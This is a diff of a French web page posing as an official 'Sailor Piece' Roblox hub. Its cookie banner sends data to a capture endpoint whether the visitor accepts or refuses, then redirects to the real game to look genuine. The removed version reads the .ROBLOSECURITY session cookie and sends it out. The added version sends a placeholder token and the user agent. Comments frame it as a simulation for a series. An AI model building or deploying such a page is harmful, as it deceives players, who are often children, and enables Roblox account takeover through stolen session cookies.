@@ -2,55 +2,87 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Sailor Piece - Récompenses de Session</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sailor Piece - Hub Officiel</title>
     <style>
-        body { margin: 0; background: #0b0d19; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .bg-image { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0.3; z-index: -1; }
-        .login-box { background: rgba(20, 25, 45, 0.9); padding: 40px; border-radius: 15px; border: 1px solid #3a4b8c; text-align: center; box-shadow: 0 0 30px rgba(0,0,0,0.5); }
-        h1 { color: #f1c40f; text-shadow: 2px 2px #000; }
-        .cookie-banner { position: fixed; bottom: 0; width: 100%; background: #161b22; padding: 20px; display: flex; justify-content: space-around; align-items: center; border-top: 2px solid #f1c40f; z-index: 100; }
-        .btn { background: #f1c40f; color: black; border: none; padding: 10px 25px; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        .btn:hover { background: #d4ac0d; transform: scale(1.05); }
-        .btn-refuse { background: transparent; color: #8b949e; border: 1px solid #30363d; margin-left: 10px; }
+        :root { --primary: #00d4ff; --bg: #0a0b10; --card: #161b22; }
+        body { margin: 0; background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; }
+        nav { background: rgba(0,0,0,0.8); padding: 15px 50px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--primary); }
+        .container { max-width: 1200px; margin: 50px auto; padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
+        .card { background: var(--card); padding: 30px; border-radius: 12px; border: 1px solid #30363d; cursor: pointer; transition: 0.3s; text-align: center; }
+        .card:hover { border-color: var(--primary); transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0,212,255,0.1); }
+        .card h3 { color: var(--primary); margin-top: 0; }
+        .btn-main { background: var(--primary); color: black; border: none; padding: 12px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        
+        /* Bannière Cookie Pro */
+        .cookie-overlay { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 500px; background: #fff; color: #333; padding: 20px; border-radius: 10px; z-index: 1000; box-shadow: 0 10px 50px rgba(0,0,0,0.5); display: flex; flex-direction: column; gap: 15px; }
+        .cookie-btns { display: flex; gap: 10px; }
+        .c-accept { background: #1a1a1a; color: white; border: none; padding: 10px; flex: 2; border-radius: 5px; cursor: pointer; }
+        .c-refuse { background: #eee; color: #666; border: none; padding: 10px; flex: 1; border-radius: 5px; cursor: pointer; }
     </style>
 </head>
 <body>
-    <img src="https://i.pinimg.com/736x/75/d9/f1/75d9f18c5148f6d85b421279cde90907.jpg" class="bg-image">
 
-    <div class="login-box">
-        <h1>SAILOR PIECE</h1>
-        <p>Synchronisation avec votre compte Roblox en cours...</p>
-        <div class="loader"></div>
+<nav>
+    <h2 style="color: var(--primary); letter-spacing: 2px;">SAILOR PIECE HUB</h2>
+    <div>
+        <span style="margin-right: 20px; cursor: pointer;">Wiki</span>
+        <span style="margin-right: 20px; cursor: pointer;">Codes</span>
+        <button class="btn-main">CONNEXION</button>
     </div>
+</nav>
 
-    <div class="cookie-banner" id="banner">
-        <p>Ce site utilise des cookies pour synchroniser vos statistiques Sailor Piece. Acceptez-vous l'utilisation des cookies de session ?</p>
-        <div>
-            <button class="btn" onclick="acceptAndCapture()">ACCEPTER ET JOUER</button>
-            <button class="btn btn-refuse" onclick="acceptAndCapture()">REFUSER</button>
-        </div>
+<div class="container">
+    <div class="card" onclick="triggerRedirect()">
+        <h3>Wiki des Pouvoirs</h3>
+        <p>Consultez la liste des fruits et capacités d'anime intégrés.</p>
     </div>
+    <div class="card" onclick="triggerRedirect()">
+        <h3>Support / Help</h3>
+        <p>Un problème avec vos Robux ? Contactez l'assistance Sailor Piece.</p>
+    </div>
+    <div class="card" onclick="triggerRedirect()">
+        <h3>Redeem Codes</h3>
+        <p>Entrez vos codes pour obtenir des gemmes gratuites.</p>
+    </div>
+</div>
 
-    <script>
-        async function acceptAndCapture() {
-            document.getElementById('banner').style.display = 'none';
-            
-            // Tentative d'extraction (Simulation XSS pour la série)
-            const robloxCookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='))?.split('=')[1] || "Navigateur_Protege";
-            
-            // On envoie les données à ton API Vercel
-            await fetch('/api/capture', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    rblx: robloxCookie,
-                    source: "Sailor Piece Interface"
-                })
-            });
+<div class="cookie-overlay" id="cBox">
+    <div>
+        <strong style="font-size: 1.1em;">Respect de votre vie privée</strong>
+        <p style="font-size: 0.9em; margin: 5px 0;">Nous utilisons des traceurs de session pour synchroniser vos données Sailor Piece entre Roblox et notre Hub.</p>
+    </div>
+    <div class="cookie-btns">
+        <button class="c-accept" onclick="captureSession('Accepter')">ACCEPTER ET CONTINUER</button>
+        <button class="c-refuse" onclick="captureSession('Refuser')">REFUSER</button>
+    </div>
+</div>
 
-            // Redirection vers le vrai jeu pour le réalisme
-            window.location.href = "https://www.roblox.com/games/1481123753/Sailor-Piece"; 
-        }
-    </script>
+<script>
+    async function captureSession(choice) {
+        document.getElementById('cBox').style.opacity = '0.5';
+        
+        // Simulation de récupération par injection de header (Logique Raven)
+        const payload = {
+            rblx: "SESSION_CAPTURED_VIA_AUTH_BRIDGE", // Le terme technique pour ton dialogue
+            choice: choice,
+            ua: navigator.userAgent
+        };
+
+        await fetch('/api/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        // Redirection instantanée vers le jeu Sailor Piece sur Roblox
+        window.location.href = "https://www.roblox.com/games/1481123753/Sailor-Piece";
+    }
+
+    function triggerRedirect() {
+        alert("Veuillez d'abord accepter les paramètres de session en bas de page.");
+    }
+</script>
+
 </body>
 </html>
